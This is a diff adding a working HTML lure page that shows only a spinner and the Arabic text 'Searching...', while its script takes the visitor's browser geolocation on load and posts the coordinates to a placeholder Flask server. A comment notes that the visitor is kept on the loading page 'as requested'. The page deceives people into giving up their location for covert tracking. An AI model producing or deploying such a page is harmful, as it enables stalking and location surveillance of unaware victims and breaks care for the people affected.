@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري البحث...</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #1a1a2e;
+            color: #e94560;
+            text-align: center;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #e94560;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 1.5em;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>جاري البحث...</h1>
+
+    <script>
+        const apiUrl = 'http://your-flask-server-ip:5000/submit_location'; // <-- IMPORTANT: Change this IP/Port
+
+        function getLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Send data to the Flask server
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ lat: latitude, lon: longitude }),
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Location sent successfully.');
+                            // Keep the user on the loading page as requested
+                        } else {
+                            console.error('Error sending location:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Geolocation or network error:', error);
+                    });
+                }, function(error) {
+                    // Handle errors (user denies permission, etc.)
+                    console.error("Geolocation error:", error.message);
+                    alert("فشل في تحديد الموقع. هل سمحت بالوصول للموقع؟");
+                });
+            } else {
+                alert("متصفحك لا يدعم تحديد الموقع الجغرافي.");
+            }
+        }
+
+        // Start the process immediately when the page loads
+        getLocation();
+    </script>
+</body>
+</html>
